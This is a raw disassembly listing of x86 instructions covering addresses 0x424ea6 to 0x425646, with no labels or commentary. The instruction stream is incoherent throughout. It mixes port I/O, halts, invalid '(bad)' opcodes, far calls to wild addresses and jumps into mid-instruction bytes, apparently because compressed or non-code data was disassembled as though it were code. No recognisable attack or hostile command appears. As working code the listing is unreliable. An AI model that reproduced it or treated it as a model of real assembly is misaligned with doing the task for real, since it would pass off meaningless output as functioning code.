  424ea6:	jns    0x424efa
  424ea8:	or     al,0x6b
  424eaa:	pop    ebp
  424eab:	hlt    
  424eac:	cmp    dl,BYTE PTR ds:0x4f97e8db
  424eb2:	fisub  DWORD PTR [eax+0x16]
  424eb5:	sub    al,BYTE PTR [ebp-0x57]
  424eb8:	mov    ds:0xe28c73ca,al
  424ebd:	xchg   edi,eax
  424ebe:	jb     0x424ee1
  424ec0:	(bad)
  424ec4:	in     al,dx
  424ec5:	push   edx
  424ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ec7:	sbb    ebx,DWORD PTR [edx-0x1c]
  424eca:	dec    ebx
  424ecb:	jno    0x424e4d
  424ecd:	ja     0x424f44
  424ecf:	pop    es
  424ed0:	jo     0x424e59
  424ed2:	mov    ebx,0xa9467352
  424ed7:	mov    al,0x44
  424ed9:	test   BYTE PTR [ebp-0x76],bh
  424edc:	out    0x73,eax
  424ede:	mov    dl,0x8b
  424ee0:	pop    ecx
  424ee1:	outs   dx,DWORD PTR ds:[esi]
  424ee2:	jb     0x424e99
  424ee4:	and    bl,dh
  424ee6:	mov    ebx,0xcbe74d33
  424eeb:	jmp    0x424f2a
  424eed:	pop    ebp
  424eee:	pop    ss
  424eef:	out    0xfd,al
  424ef1:	jecxz  0x424ebb
  424ef3:	lahf   
  424ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ef5:	mov    al,0x53
  424ef7:	out    0x4,al
  424ef9:	mov    al,dl
  424efb:	push   edi
  424efc:	jp     0x424f3a
  424efe:	add    eax,0xf0a4b8bb
  424f03:	dec    eax
  424f04:	cld    
  424f05:	cmp    DWORD PTR [ebp+0x60a6ed83],ebp
  424f0b:	hlt    
  424f0c:	stos   BYTE PTR es:[edi],al
  424f0d:	and    ebp,DWORD PTR [ebp+0x57]
  424f10:	sti    
  424f11:	rcr    ecx,cl
  424f13:	sub    BYTE PTR [esi-0x7],0x2
  424f17:	mov    ds:0x92774688,eax
  424f1c:	mov    dl,0x41
  424f1e:	xor    ebp,DWORD PTR [esi]
  424f20:	enter  0x6d00,0xcd
  424f24:	cmp    DWORD PTR [eax+0x169d68],eax
  424f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f2b:	push   edi
  424f2c:	call   0x679ee01
  424f31:	jns    0x424ed5
  424f33:	aaa    
  424f34:	je     0x424f44
  424f36:	jae    0x424f0a
  424f38:	inc    ecx
  424f39:	into   
  424f3a:	jmp    0x424f16
  424f3c:	jbe    0x424f86
  424f3e:	imul   ebx,edi,0xffffffb7
  424f41:	push   esp
  424f42:	imul   ecx,DWORD PTR [edx],0xa43d0a36
  424f48:	and    eax,DWORD PTR [esi+ebp*4]
  424f4b:	mov    dl,0xae
  424f4d:	push   0x1501c389
  424f52:	les    esi,FWORD PTR [edx+0x64]
  424f55:	adc    bh,bh
  424f57:	std    
  424f58:	xchg   esp,eax
  424f59:	mov    ah,BYTE PTR [ebx-0x50]
  424f5c:	xchg   esi,eax
  424f5d:	mov    ah,0x45
  424f5f:	cmp    bh,bl
  424f61:	mov    eax,0x9bf47107
  424f66:	cdq    
  424f67:	inc    edx
  424f68:	inc    edi
  424f69:	push   ecx
  424f6a:	or     al,0xa8
  424f6c:	inc    ebp
  424f6d:	push   0x12
  424f6f:	add    al,BYTE PTR [ecx-0x4419df2]
  424f75:	in     eax,dx
  424f76:	xchg   edi,eax
  424f77:	push   esi
  424f78:	daa    
  424f79:	in     eax,0xba
  424f7b:	adc    dh,BYTE PTR [edx+esi*2-0x131a1815]
  424f82:	pop    ebx
  424f83:	cmp    ebx,ecx
  424f85:	cli    
  424f86:	dec    edx
  424f87:	cmp    cl,0x75
  424f8a:	xchg   edi,eax
  424f8b:	mov    ch,dh
  424f8d:	jge    0x425009
  424f8f:	add    bh,BYTE PTR [edx-0x6f]
  424f92:	push   edx
  424f93:	adc    dh,BYTE PTR [ecx-0x123f19bd]
  424f99:	aam    0x11
  424f9b:	push   0xffffffe5
  424f9d:	jb     0x425007
  424f9f:	push   es
  424fa0:	or     al,0xa0
  424fa2:	leave  
  424fa3:	popa   
  424fa4:	mov    gs,WORD PTR [ebx-0x4b]
  424fa7:	xor    BYTE PTR [eax+0x24acfd9e],cl
  424fad:	dec    edx
  424fae:	jle    0x424f54
  424fb0:	pop    esi
  424fb1:	push   0x1cc05e
  424fb6:	push   0xffffffcb
  424fb8:	retf   
  424fb9:	adc    eax,ebp
  424fbb:	test   DWORD PTR [ebp+0x7834bce2],edx
  424fc1:	sub    edi,DWORD PTR [edx+0x45]
  424fc4:	mov    BYTE PTR [ecx-0x77],bh
  424fc7:	dec    esi
  424fc8:	jmp    0x424f84
  424fca:	outs   dx,BYTE PTR ds:[esi]
  424fcb:	hlt    
  424fcc:	fmul   QWORD PTR [esi]
  424fce:	leave  
  424fcf:	cmc    
  424fd0:	jecxz  0x424f8e
  424fd2:	mov    eax,ds:0xa83aa01
  424fd7:	lds    ecx,FWORD PTR [edx]
  424fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fda:	dec    esp
  424fdb:	dec    esp
  424fdc:	out    0x26,eax
  424fde:	xchg   esi,eax
  424fdf:	xor    cl,BYTE PTR [ecx-0x437e3c06]
  424fe5:	or     BYTE PTR [edx+0x52],ch
  424fe8:	retf   
  424fe9:	inc    esp
  424fea:	in     eax,dx
  424feb:	lea    ebp,[edi-0x62]
  424fee:	mov    al,ds:0x3d51345d
  424ff3:	or     BYTE PTR [edi+0x5d11559f],dh
  424ff9:	cld    
  424ffa:	sbb    dl,al
  424ffc:	jne    0x424f99
  424ffe:	push   ebx
  424fff:	adc    eax,0x382e402
  425004:	inc    esp
  425005:	test   BYTE PTR [edx+0x27],dl
  425008:	inc    edi
  425009:	mov    ecx,0xf03ac4c8
  42500e:	aad    0x8d
  425010:	inc    edx
  425011:	iret   
  425012:	jecxz  0x425039
  425014:	out    dx,eax
  425015:	cs scas al,BYTE PTR es:[edi]
  425017:	(bad)
  42501a:	aaa    
  42501b:	lods   eax,DWORD PTR ds:[esi]
  42501c:	sbb    BYTE PTR [ebx],cl
  42501e:	ficomp WORD PTR [edi+ebp*1]
  425021:	pop    esi
  425022:	retf   0xd02e
  425025:	and    edi,ebp
  425027:	in     eax,dx
  425028:	stos   DWORD PTR es:[edi],eax
  425029:	das    
  42502a:	xchg   esp,eax
  42502b:	dec    ebp
  42502c:	pop    ebp
  42502d:	sti    
  42502e:	push   0xffffffba
  425030:	gs mov ch,0xc7
  425033:	scas   eax,DWORD PTR es:[edi]
  425034:	fild   DWORD PTR [ebp+0x2f01f6eb]
  42503a:	ins    BYTE PTR es:[edi],dx
  42503b:	lods   eax,DWORD PTR ds:[esi]
  42503c:	push   esp
  42503d:	inc    eax
  42503e:	xor    ebp,DWORD PTR [ebp+0x5a]
  425041:	add    al,0xa9
  425043:	rol    ecx,1
  425045:	mov    eax,ds:0xec49cf54
  42504a:	cld    
  42504b:	sub    esi,ecx
	...
  425059:	add    BYTE PTR [ebx-0x73],al
  42505c:	pop    ds
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0x2d
  425067:	in     al,dx
  425068:	mov    eax,ds:0x1c85927
  42506d:	add    bl,bh
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [edx+ebp*2],al
  425074:	pop    ds
  425075:	xor    BYTE PTR [ebx-0x33],0xc2
  425079:	hlt    
  42507a:	fmul   QWORD PTR [eax+0x2ab08d54]
  425080:	add    DWORD PTR [ebx],edx
  425082:	pop    ss
  425083:	and    DWORD PTR [esi-0x2a6349cd],ebx
  425089:	leave  
  42508a:	and    eax,0xc8051bbe
  42508f:	out    dx,al
  425090:	imul   esi,DWORD PTR [ecx-0x78f4b125],0xffffffbc
  425097:	xor    DWORD PTR [edi+0x17c7764e],esp
  42509d:	ss lock (bad) 
  4250a1:	xchg   ecx,eax
  4250a2:	or     al,0x55
  4250a4:	adc    al,0x3c
  4250a6:	push   ds
  4250a7:	or     al,0x8a
  4250aa:	mov    WORD PTR [esi+0x6a],?
  4250ad:	lea    ebx,[ebp+0x2]
  4250b0:	mov    edi,0x2d7b2ed0
  4250b5:	test   DWORD PTR [eax-0x3f433cbe],0xadce73b6
  4250bf:	lods   eax,DWORD PTR ds:[esi]
  4250c0:	push   ss
  4250c1:	mov    esi,0x71a3fd53
  4250c6:	push   eax
  4250c7:	sub    dl,BYTE PTR [esi]
  4250c9:	jbe    0x425057
  4250cb:	sahf   
  4250cc:	pop    ebx
  4250cd:	icebp  
  4250ce:	sub    BYTE PTR [ebp+edi*4+0x6e48c6b2],al
  4250d5:	xchg   edx,eax
  4250d6:	mov    esi,0xa9fd788d
  4250db:	inc    esp
  4250dc:	(bad)  
  4250dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250de:	lock mov esp,fs
  4250e1:	adc    ecx,DWORD PTR [esi-0x593366f7]
  4250e7:	pop    esp
  4250e8:	imul   esi,DWORD PTR [edx-0x57e1678b],0xfdc965e2
  4250f2:	mov    eax,0x9b71547a
  4250f7:	cmp    al,0xba
  4250f9:	and    cl,al
  4250fb:	out    0xe4,al
  4250fd:	mov    esi,esi
  4250ff:	jmp    0x425096
  425101:	add    BYTE PTR [ecx],cl
  425103:	jb     0x425113
  425105:	aaa    
  425106:	xchg   edx,eax
  425107:	sti    
  425108:	lods   al,BYTE PTR ds:[esi]
  425109:	jmp    DWORD PTR [edi-0x28]
  42510c:	sbb    eax,0x4a5c0d80
  425111:	out    0xea,eax
  425113:	xchg   esi,eax
  425114:	mov    esi,0xdae01d47
  425119:	es std 
  42511b:	jmp    0x5f330b9d
  425120:	inc    esi
  425121:	cwde   
  425122:	out    0x9e,eax
  425124:	inc    esp
  425125:	scas   eax,DWORD PTR es:[edi]
  425126:	dec    esi
  425127:	xlat   BYTE PTR ds:[ebx]
  425128:	fistp  QWORD PTR [ecx+edi*4+0x1d]
  42512c:	ret    
  42512d:	xor    al,0xed
  42512f:	sbb    BYTE PTR [esi+0x4a2d3ee3],dh
  425135:	jl     0x4250c2
  425137:	inc    esp
  425138:	sub    dh,al
  42513a:	xchg   edx,eax
  42513b:	pcmpeqd mm7,QWORD PTR [ebp-0x4ed19eb4]
  425142:	adc    eax,0x11fb1d4a
  425147:	int3   
  425148:	out    dx,eax
  425149:	inc    esp
  42514a:	push   es
  42514b:	cwde   
  42514c:	rol    DWORD PTR [eax+0x6300529f],cl
  425152:	push   cs
  425153:	popa   
  425154:	dec    ecx
  425155:	dec    esi
  425156:	sub    eax,0x7d0eeca8
  42515b:	sbb    bl,BYTE PTR [ecx-0x24]
  42515e:	cmc    
  42515f:	add    edi,ebp
  425161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425162:	lahf   
  425163:	cmp    BYTE PTR [esi-0x6e79a2bb],dh
  425169:	or     BYTE PTR [eax-0x58],cl
  42516c:	xlat   BYTE PTR ds:[ebx]
  42516d:	inc    ebp
  42516e:	xor    eax,0x2adb39a7
  425173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425174:	xor    eax,0xf1c2bdd
  425179:	inc    eax
  42517a:	int    0x8e
  42517c:	addr16 jmp 0x4251f4
  42517f:	push   0xe4c1b7dd
  425184:	xchg   ebp,eax
  425185:	imul   BYTE PTR [edx-0x59750a7f]
  42518b:	mov    ebp,0xcb00b44d
  425190:	or     ah,BYTE PTR [ebx-0x52]
  425193:	dec    ebp
  425194:	mov    dh,0xec
  425196:	sbb    eax,edi
  425198:	dec    ebp
  425199:	das    
  42519a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42519b:	dec    esi
  42519c:	xor    DWORD PTR [edi-0x3033a280],esp
  4251a2:	fdivr  QWORD PTR [ebx-0x3c]
  4251a5:	fisub  WORD PTR [ebp+ebp*2+0x74]
  4251a9:	js     0x42515c
  4251ab:	ins    BYTE PTR es:[edi],dx
  4251ac:	jbe    0x425158
  4251ae:	cmp    BYTE PTR [edx],al
  4251b0:	retf   
  4251b1:	mov    edx,0x82b1e352
  4251b6:	lock push edx
  4251b8:	mov    WORD PTR [ebx],gs
  4251ba:	aas    
  4251bb:	rcl    bh,1
  4251bd:	test   eax,0x2b891f41
  4251c2:	inc    edi
  4251c3:	out    dx,al
  4251c4:	(bad)  
  4251c6:	adc    BYTE PTR [ecx+0x2c],al
  4251c9:	xchg   edx,eax
  4251ca:	add    edx,DWORD PTR [eax+0x31]
  4251cd:	mov    dh,0xee
  4251cf:	js     0x42518f
  4251d1:	sub    BYTE PTR [ebx],cl
  4251d3:	lods   al,BYTE PTR ds:[esi]
  4251d4:	pop    ss
  4251d5:	sub    BYTE PTR [edx],bh
  4251d7:	add    al,0x94
  4251d9:	dec    esi
  4251da:	fmul   DWORD PTR [edi+0x5434d1ce]
  4251e0:	rol    DWORD PTR [esi],cl
  4251e2:	dec    ebp
  4251e3:	in     al,0x8
  4251e5:	sub    eax,0x296310cb
  4251ea:	push   esp
  4251eb:	sbb    eax,0xc7367530
  4251f0:	xchg   ebx,eax
  4251f1:	and    edx,0x2f
  4251f4:	retf   0x784b
  4251f7:	xchg   edi,eax
  4251f8:	in     eax,0x71
  4251fa:	push   ebp
  4251fb:	popa   
  4251fc:	repz dec ebp
  4251fe:	cmc    
  4251ff:	in     al,dx
  425200:	or     al,0xad
  425202:	jae    0x425255
  425204:	xchg   cl,ah
  425206:	mov    ah,0x63
  425208:	jae    0x425271
  42520a:	aas    
  42520b:	dec    ecx
  42520c:	nop
  42520d:	hlt    
  42520e:	inc    ebx
  42520f:	push   esp
  425210:	comiss xmm7,DWORD PTR fs:[edi-0x468ff48c]
  425218:	je     0x4251c6
  42521a:	cmp    ch,BYTE PTR [ebp+0x6b1bde2b]
  425220:	ins    DWORD PTR es:[edi],dx
  425221:	leave  
  425222:	jb     0x42525b
  425224:	jle    0x4251c9
  425226:	(bad)  
  425228:	mov    esp,0x4624b8eb
  42522d:	sti    
  42522e:	pop    ss
  42522f:	loop   0x425212
  425231:	repz repnz sub al,al
  425235:	mov    ah,0x56
  425237:	fs xchg ebx,eax
  425239:	push   edi
  42523a:	sti    
  42523b:	inc    edx
  42523c:	adc    al,ch
  42523e:	push   es
  42523f:	outs   dx,BYTE PTR ds:[esi]
  425240:	ins    BYTE PTR es:[edi],dx
  425241:	(bad)  [esi+0x5eae9725]
  425247:	mov    bl,0xc9
  425249:	js     0x425238
  42524b:	(bad)  
  42524c:	pop    ss
  42524d:	jbe    0x425277
  42524f:	int    0xb3
  425251:	cmp    edi,DWORD PTR [edx]
  425253:	shl    BYTE PTR [ebx-0x71a3d60c],0xca
  42525a:	jns    0x425263
  42525c:	into   
  42525d:	push   ebp
  42525e:	jae    0x425213
  425260:	push   cs
  425261:	adc    esp,edi
  425263:	fldenv ds:0xdee90a3c
  425269:	lock push edx
  42526b:	inc    eax
  42526c:	mov    eax,DWORD PTR [eax]
	...
  42527a:	hlt    
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	jmp    0x54a21486
  42528b:	retf   0x1
  42528e:	sti    
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    BYTE PTR [ebp+0x44],dh
  425294:	(bad)  
  425295:	aam    0x4c
  425297:	xor    esi,DWORD PTR [edi+0x4148c488]
  42529d:	push   ds
  42529e:	jnp    0x4252ea
  4252a0:	ja     0x425229
  4252a2:	sar    BYTE PTR [ebp-0x3a34a6e3],cl
  4252a8:	js     0x4252ca
  4252aa:	hlt    
  4252ab:	fmulp  st(0),st
  4252ad:	pop    ss
  4252ae:	jo     0x42524a
  4252b0:	xor    esp,DWORD PTR [ebp+0x9d879bb]
  4252b6:	shl    ah,0xab
  4252b9:	mov    esp,DWORD PTR [edi-0x18]
  4252bc:	sbb    DWORD PTR [ecx-0x9],edx
  4252bf:	fcmovbe st,st(0)
  4252c1:	or     eax,0xff357599
  4252c6:	or     DWORD PTR [edi+0x2d],esi
  4252c9:	pop    ebp
  4252ca:	cdq    
  4252cb:	enter  0xc3aa,0xea
  4252cf:	dec    esp
  4252d0:	das    
  4252d1:	inc    eax
  4252d2:	stos   DWORD PTR es:[edi],eax
  4252d3:	lods   al,BYTE PTR ds:[esi]
  4252d4:	lock clc 
  4252d6:	lea    esi,[ecx-0x6c]
  4252d9:	test   eax,0x48033991
  4252de:	(bad)  
  4252df:	cli    
  4252e0:	and    ecx,DWORD PTR ss:0x527e6cfd
  4252e7:	xor    DWORD PTR ds:0x8bff5f53,esi
  4252ed:	adc    al,0xe7
  4252ef:	loop   0x4252d1
  4252f1:	aas    
  4252f2:	pusha  
  4252f3:	cmp    ch,ah
  4252f5:	lock push cs
  4252f7:	mov    ebx,0x7e43302f
  4252fc:	mov    ecx,gs
  4252fe:	dec    esi
  4252ff:	ret    0x9490
  425302:	dec    ecx
  425303:	pop    ebx
  425304:	inc    ebp
  425305:	stc    
  425306:	enter  0x23bf,0x91
  42530a:	sub    al,0x5
  42530c:	add    dl,bl
  42530e:	stc    
  42530f:	sar    DWORD PTR [eax+eax*2],cl
  425312:	mov    BYTE PTR [ecx-0x5b],ah
  425315:	mov    al,0xcf
  425317:	div    DWORD PTR [ebx+0x2c]
  42531a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42531b:	add    edi,DWORD PTR ds:0x40548981
  425321:	in     eax,0xcb
  425323:	sti    
  425324:	hlt    
  425325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425326:	dec    ecx
  425327:	pop    ecx
  425328:	mov    ecx,0x7c8fd331
  42532d:	outs   dx,DWORD PTR ds:[esi]
  42532e:	jle    0x42537e
  425330:	push   ebp
  425331:	pop    esp
  425332:	mov    eax,0xaf522329
  425337:	pop    edx
  425338:	dec    esi
  425339:	mov    ds:0x9e9dcf4a,al
  42533e:	inc    eax
  42533f:	xor    DWORD PTR [ecx+0x34eb8ef8],esp
  425345:	xchg   esi,eax
  425346:	sar    DWORD PTR [edx],0x89
  425349:	push   ebp
  42534a:	jecxz  0x425302
  42534c:	push   edx
  42534d:	fadd   DWORD PTR [eax-0x51]
  425350:	pop    es
  425351:	jmp    0x42532b
  425353:	fnstcw WORD PTR [edi+0x3f]
  425356:	mov    ch,0x6f
  425358:	sub    eax,0xa86b80fb
  42535d:	push   cs
  42535e:	push   ebx
  42535f:	jge    0x4253b3
  425361:	cmp    eax,0xcc95a378
  425366:	jg     0x425351
  425368:	out    0xb5,eax
  42536a:	out    dx,eax
  42536b:	mov    edi,0x2c7888fc
  425370:	mov    ebp,0xb2708955
  425375:	cs ss mov eax,ebx
  425379:	mov    ah,0x78
  42537b:	mov    cl,0x34
  42537d:	xchg   edx,eax
  42537e:	cli    
  42537f:	jl     0x4253b5
  425381:	shr    BYTE PTR [esi],0x47
  425384:	xor    al,0x79
  425386:	jmp    0x42531f
  425388:	mov    bh,0xe9
  42538a:	sub    al,0xc9
  42538c:	or     BYTE PTR [edi-0x3a],ah
  42538f:	dec    eax
  425390:	jg     0x4253b8
  425392:	clc    
  425393:	push   es
  425394:	adc    al,0xb8
  425396:	test   edx,0x92a63832
  42539c:	mov    ecx,0xfc9e9591
  4253a1:	xchg   ebp,eax
  4253a2:	retf   
  4253a3:	shl    BYTE PTR [eax-0x1b],cl
  4253a6:	pop    esi
  4253a7:	jecxz  0x425346
  4253a9:	pop    edi
  4253aa:	push   esi
  4253ab:	out    0x9,al
  4253ad:	and    BYTE PTR [ebx],0x9c
  4253b0:	punpckhdq mm5,mm2
  4253b3:	dec    ebx
  4253b4:	adc    esp,DWORD PTR [ebx]
  4253b6:	pop    ss
  4253b7:	test   BYTE PTR [ecx+eiz*1+0x6870824b],0xde
  4253bf:	aas    
  4253c0:	out    dx,eax
  4253c1:	push   es
  4253c2:	mov    bl,BYTE PTR [ebp+0x21]
  4253c5:	mov    esp,0x801068c9
  4253ca:	rol    DWORD PTR [ebx-0x63aa87c8],cl
  4253d0:	call   0xa9d3c1f
  4253d5:	sub    dl,dl
  4253d7:	retf   0xda6c
  4253da:	and    ebp,DWORD PTR [eax]
  4253dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253dd:	jns    0x425457
  4253df:	jmp    0x7a7fea62
  4253e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253e5:	and    eax,0x76151453
  4253ea:	sbb    al,0x41
  4253ec:	dec    ebx
  4253ed:	aas    
  4253ee:	sti    
  4253ef:	jne    0x4253b6
  4253f1:	jecxz  0x425386
  4253f3:	nop
  4253f4:	cld    
  4253f5:	adc    ch,BYTE PTR [ebx-0x31783000]
  4253fb:	pop    ecx
  4253fc:	stc    
  4253fd:	stos   BYTE PTR es:[edi],al
  4253fe:	jmp    DWORD PTR [ebx+0x4a226d0f]
  425404:	jno    0x4253c6
  425406:	gs or  al,0x5b
  425409:	pop    edi
  42540a:	sub    edx,esi
  42540c:	push   ebx
  42540d:	inc    ecx
  42540e:	jbe    0x4253f7
  425410:	out    dx,eax
  425411:	outs   dx,BYTE PTR ds:[esi]
  425412:	mov    ecx,0x117fc812
  425417:	jge    0x425478
  425419:	or     bh,ah
  42541b:	sub    DWORD PTR [edi-0x1b67aea],ebx
  425421:	xor    cl,BYTE PTR [edi-0x8c51bf1]
  425427:	in     al,0xec
  425429:	adc    DWORD PTR ds:0xed825c27,esp
  42542f:	sub    al,0x99
  425431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425432:	and    BYTE PTR [edi],al
  425434:	das    
  425435:	pop    ds
  425436:	lds    ebx,FWORD PTR [edi+0x59b5d7d]
  42543c:	cs lock idiv ah
  425440:	stc    
  425441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425442:	aam    0xee
  425444:	cwde   
  425445:	inc    ebx
  425446:	xchg   BYTE PTR [edx-0xce770b4],al
  42544c:	xor    DWORD PTR [ecx],edi
  42544e:	push   edx
  42544f:	adc    eax,0x21d255c0
  425454:	mov    bl,0xa2
  425456:	mov    ebx,0xedc10a1f
  42545b:	mov    dh,0xd3
  42545d:	dec    ebp
  42545e:	fsubr  QWORD PTR [esp+edx*1+0x232d8959]
  425465:	jne    0x42546d
  425467:	loope  0x42544c
  425469:	out    dx,eax
  42546a:	jmp    0x4d3fa721
  42546f:	fmul   DWORD PTR [edx+0x1a]
  425472:	icebp  
  425473:	xchg   ebp,eax
  425474:	sbb    bh,BYTE PTR [edx+0x34]
  425477:	rcr    DWORD PTR [esi+0x1c],1
  42547a:	sub    eax,ebp
  42547c:	pop    ebp
  42547d:	or     al,0x8b
  42547f:	lahf   
  425480:	adc    DWORD PTR [ecx-0x19e87411],edx
  425486:	cmc    
  425487:	aad    0x5a
  425489:	in     al,dx
  42548a:	les    edx,FWORD PTR [edx]
  42548c:	sbb    al,0x0
	...
  42549a:	push   esp
  42549b:	ds and al,0x19
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	sbb    edi,DWORD PTR [ebp+0x7f]
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	xchg   ebp,eax
  4254a7:	in     al,dx
  4254a8:	int3   
  4254a9:	inc    edi
  4254aa:	dec    edi
  4254ab:	int3   
  4254ac:	add    DWORD PTR [eax],eax
  4254ae:	sti    
  4254af:	add    DWORD PTR [eax],eax
  4254b1:	add    ch,cl
  4254b3:	in     al,dx
  4254b4:	cmp    DWORD PTR [eax],esi
  4254b6:	push   esp
  4254b7:	push   ds
  4254b8:	mul    ebx
  4254ba:	and    eax,0x6b139162
  4254bf:	mov    ecx,DWORD PTR [edx+0x4cc7ae34]
  4254c5:	(bad)
  4254c9:	cmp    ah,BYTE PTR [edi+0x750ee791]
  4254cf:	mov    edi,eax
  4254d1:	jno    0x42547e
  4254d3:	pop    eax
  4254d4:	and    edx,edi
  4254d6:	cmp    eax,0x1f2f9fc
  4254db:	pushf  
  4254dc:	test   eax,edi
  4254de:	mov    ebx,ebx
  4254e0:	jmp    0x4254fb
  4254e2:	arpl   WORD PTR [edi],di
  4254e4:	rol    BYTE PTR [edx-0x5a],0xb5
  4254e8:	outs   dx,BYTE PTR cs:[esi]
  4254ea:	ss sbb eax,0xd16d8249
  4254f0:	mov    ebp,0xc7837adc
  4254f5:	ud1    esi,DWORD PTR [ecx]
  4254f8:	lods   eax,DWORD PTR ds:[si]
  4254fa:	jns    0x4254a1
  4254fc:	iret   
  4254fd:	int3   
  4254fe:	adc    BYTE PTR [ebx],al
  425500:	inc    esp
  425501:	stos   DWORD PTR es:[edi],eax
  425502:	arpl   WORD PTR [ebx],si
  425504:	mov    edi,DWORD PTR ds:0x4c04429d
  42550a:	xchg   esi,eax
  42550b:	mov    dh,0xde
  42550d:	and    al,al
  42550f:	sbb    ecx,ecx
  425511:	sbb    ebp,DWORD PTR [ebx-0x74aacb03]
  425517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425518:	arpl   WORD PTR [eax-0x53],dx
  42551b:	dec    ah
  42551d:	sub    al,0x3a
  42551f:	adc    DWORD PTR ds:0xff0affb8,eax
  425525:	dec    esp
  425526:	mov    ds:0xe98aee2c,eax
  42552b:	pop    esi
  42552c:	scas   eax,DWORD PTR es:[edi]
  42552d:	pusha  
  42552e:	sub    dl,BYTE PTR [ecx-0x75]
  425531:	in     al,dx
  425532:	push   0x17
  425534:	jne    0x42550f
  425536:	xor    dh,bh
  425538:	lds    esp,FWORD PTR [ebx]
  42553a:	and    dl,BYTE PTR [eax-0x7fc6d610]
  425540:	inc    eax
  425541:	adc    edx,DWORD PTR [esi+0x18]
  425544:	mov    BYTE PTR [esp+eiz*8+0x5e],dl
  425548:	pop    edx
  425549:	sub    al,0xe0
  42554b:	(bad)  
  42554c:	and    BYTE PTR [ebx+edx*4],al
  42554f:	jmp    0x362ce094
  425554:	cli    
  425555:	dec    eax
  425556:	dec    edx
  425557:	mov    edx,0x207606be
  42555c:	and    DWORD PTR [esi],esp
  42555e:	push   esi
  42555f:	aad    0xd3
  425561:	push   ds
  425562:	(bad)  [ecx+eiz*4+0x106d8d39]
  425569:	sub    DWORD PTR [edx+ecx*8-0x2e],edi
  42556d:	and    al,0xb1
  42556f:	(bad)  
  425570:	cmp    ebx,esi
  425572:	mov    bh,0x18
  425574:	pop    ds
  425575:	out    0x47,eax
  425577:	int3   
  425578:	add    esp,DWORD PTR [esi+0x48]
  42557b:	cmp    ebp,DWORD PTR [ecx-0x55]
  42557e:	mov    ch,0x67
  425580:	push   edx
  425581:	pop    ebp
  425582:	xor    dh,0x16
  425585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425586:	cmc    
  425587:	sahf   
  425588:	into   
  425589:	inc    ebp
  42558a:	clc    
  42558b:	jecxz  0x4255c0
  42558d:	add    BYTE PTR [edx],cl
  42558f:	xchg   DWORD PTR [edx-0x7d96a171],ebp
  425595:	shl    esi,0x68
  425598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425599:	and    eax,0xbb2996f2
  42559e:	cmp    DWORD PTR [ecx],esp
  4255a0:	lods   eax,DWORD PTR ds:[esi]
  4255a1:	xor    eax,DWORD PTR [edi-0x4c1a97d0]
  4255a7:	inc    esp
  4255a8:	das    
  4255a9:	icebp  
  4255aa:	aam    0x16
  4255ac:	jmp    0xd25026e1
  4255b1:	xchg   ecx,eax
  4255b2:	adc    ebx,DWORD PTR [edi+0x1d85dbdc]
  4255b8:	mov    bl,0x6d
  4255ba:	not    DWORD PTR [ebp+esi*8-0x6a38073]
  4255c1:	dec    ecx
  4255c2:	cdq    
  4255c3:	int    0x7a
  4255c5:	inc    eax
  4255c6:	cli    
  4255c7:	cmp    DWORD PTR [esi-0xa043417],edi
  4255cd:	test   al,0xde
  4255d0:	cmc    
  4255d1:	cmc    
  4255d2:	imul   edi,DWORD PTR [eax+0x19],0x675b31e3
  4255d9:	or     ecx,ebx
  4255db:	sbb    edx,0x647b791f
  4255e1:	retf   
  4255e2:	outs   dx,DWORD PTR ds:[esi]
  4255e3:	jnp    0x42562b
  4255e5:	xor    dl,BYTE PTR [esi+0x2b]
  4255e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255e9:	retf   
  4255ea:	or     DWORD PTR [edi+eiz*8],ebp
  4255ed:	pop    eax
  4255ee:	or     BYTE PTR [edx-0x61996e10],al
  4255f4:	or     esp,edi
  4255f6:	and    al,0xe6
  4255f8:	jnp    0x425650
  4255fa:	lods   al,BYTE PTR ds:[esi]
  4255fb:	mov    ebx,0xa85d2cc8
  425600:	sbb    al,0x1c
  425602:	pop    ebp
  425603:	ins    DWORD PTR es:[edi],dx
  425604:	xchg   edx,eax
  425605:	fstp   DWORD PTR [edi-0x7e315f45]
  42560b:	mov    BYTE PTR [esp+ebp*2-0x35],dh
  42560f:	pop    edx
  425610:	out    dx,al
  425611:	or     edi,DWORD PTR [ebp+0x63]
  425614:	popa   
  425615:	sbb    eax,0xbd02fb5f
  42561a:	lods   eax,DWORD PTR ds:[esi]
  42561b:	loop   0x425697
  42561d:	dec    eax
  42561e:	cmp    al,0xdb
  425620:	movhps QWORD PTR [ebp-0x59],xmm6
  425624:	in     al,0x61
  425626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425627:	mov    bl,0xa0
  425629:	lahf   
  42562a:	xor    al,0xcd
  42562d:	pop    sp
  42562f:	lock rcr bh,cl
  425632:	xor    bh,BYTE PTR [esi-0x4b]
  425635:	xchg   ebp,eax
  425636:	xor    DWORD PTR [eax],0x1fac220d
  42563c:	imul   BYTE PTR [esi+ebx*4]
  42563f:	call   0x8e55:0xc35e8e9e
  425646:	pop    ds
